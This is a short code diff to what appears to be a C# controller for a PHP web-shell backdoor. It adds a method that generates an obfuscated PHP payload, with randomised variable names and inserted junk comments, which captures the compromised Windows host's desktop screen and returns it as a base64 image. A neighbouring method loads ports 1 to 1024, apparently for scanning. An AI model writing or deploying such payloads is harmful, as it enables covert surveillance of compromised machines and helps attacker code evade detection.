@@ -255,6 +255,23 @@ namespace bantam.Classes
         }
 
         /// <summary>
+        /// 
+        /// </summary>
+        /// <returns></returns>
+        public static string WindowsDesktopScreenShot()
+        {
+            string imageResource = RandomPHPVar();
+            string imageData = RandomPHPVar();
+
+            return "ob_start();" + RandomPHPComment()
+                 + imageResource + " = imagegrabscreen();"
+                + "imagepng(" + imageResource + ");" + RandomPHPComment()
+                 + imageData + " = ob_get_clean();"
+                 + "imagedestroy(" + imageResource + ");" + RandomPHPComment()
+                 + "echo '<img src=\"data:image/png;base64,'.base64_encode(" + imageData + ").'\" />';";
+        }
+
+        /// <summary>
         /// Puts port 1-1024 into php variable $ports
         /// </summary>
         /// <returns></returns>
